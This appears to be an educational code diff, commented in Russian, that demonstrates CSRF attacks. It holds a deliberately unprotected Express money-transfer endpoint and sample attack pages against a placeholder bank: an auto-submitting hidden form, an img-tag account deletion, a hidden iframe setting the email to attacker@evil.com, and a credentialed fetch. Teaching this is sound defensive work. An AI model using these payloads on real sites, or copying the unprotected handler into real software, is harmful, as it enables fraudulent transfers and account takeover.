@@ -1,0 +1,52 @@
+
+// ❌ УЯЗВИМЫЙ КОД - CSRF атака
+
+// Серверный код без защиты
+app.post('/transfer-money', (req, res) => {
+const { to, amount } = req.body;
+const userId = req.session.userId; // Пользователь авторизован
+
+// ОПАСНО! Нет проверки origin запроса
+transferMoney(userId, to, amount);
+
+res.json({ success: true });
+});
+
+// Вредоносный сайт attacker.com
+// HTML форма автоматически отправляется
+`
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Вы выиграли приз!</h1>
+<form id="malicious" method="POST" action="https://bank.com/transfer-money">
+  <input type="hidden" name="to" value="attacker_account">
+  <input type="hidden" name="amount" value="10000">
+</form>
+<script>
+  // Автоматическая отправка формы
+  document.getElementById('malicious').submit();
+</script>
+</body>
+</html>
+`
+
+// Другие примеры CSRF
+`
+<!-- Атака через img тег (GET запрос) -->
+<img src="https://bank.com/delete-account?confirm=yes">
+
+<!-- Атака через iframe -->
+<iframe style="display:none"
+        src="https://bank.com/change-email?email=attacker@evil.com">
+</iframe>
+
+<!-- Атака через fetch (современные браузеры блокируют без CORS) -->
+<script>
+  fetch('https://bank.com/transfer-money', {
+    method: 'POST',
+    credentials: 'include', // Включает cookies
+    body: JSON.stringify({ to: 'attacker', amount: 10000 })
+  });
+</script>
+`
